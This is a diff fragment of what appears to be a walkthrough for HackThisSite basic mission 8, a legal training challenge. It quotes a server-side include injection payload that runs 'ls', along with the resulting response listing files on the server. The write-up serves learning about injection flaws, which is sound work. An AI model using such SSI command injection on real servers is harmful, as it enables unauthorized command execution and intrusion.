@@ -15,6 +15,7 @@ But SSI is a simple interpreted server-side scripting language used almost exclu
 `<!--#exec cmd="ls"-->`
 
 ## Response
+
 path: hackthissite.org/html/missions/basic/8/tmp/randomfile.shtml
 body: Hi, tshngmww.shtml hipykpqu.shtml ztxdhjxn.shtml avpfeoie.shtml fviqpmaw.shtml kqbybdzc.shtml dzrnmzgx.shtml npcsygfl.shtml whqxxojt.shtml ylomcmvu.shtml uhdppswp.shtml gzntiicx.shtml dzwbqiuu.shtml qvzuieng.shtml smcerykh.shtml qjhnmhmq.shtml znodwztr.shtml! Your name contains 254 characters.
 
